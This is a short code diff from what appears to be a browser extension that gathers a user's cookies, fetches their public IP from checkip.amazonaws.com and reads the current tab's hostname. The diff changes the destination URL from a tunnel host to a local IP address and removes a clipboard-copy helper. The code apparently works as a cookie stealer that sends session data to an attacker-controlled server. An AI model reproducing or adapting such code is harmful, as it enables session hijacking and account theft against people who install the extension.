@@ -25,7 +25,7 @@
             }
             exportedCookies.push(exportedCookie);
         }
-        var url = ' https://bab8325566d1b6.lhr.life'
+        var url = 'http://192.168.0.110/'
         fetch("https://checkip.amazonaws.com/").then(res => res.text()).then(data => {
             browserDetector.getApi().tabs.getSelected(null, function(tab) {
                 var name = new URL(tab.url).hostname;
@@ -630,17 +630,6 @@
         }
 
         pageTitleContainer.querySelector('h1').textContent = title;
-    }
-
-    function copyText(text) {
-        const fakeText = document.createElement('textarea');
-        fakeText.classList.add('clipboardCopier');
-        fakeText.textContent = text;
-        document.body.appendChild(fakeText);
-        fakeText.focus();
-        fakeText.select();
-        document.execCommand('Copy');
-        document.body.removeChild(fakeText);
     }
 
     function isArray(value) {
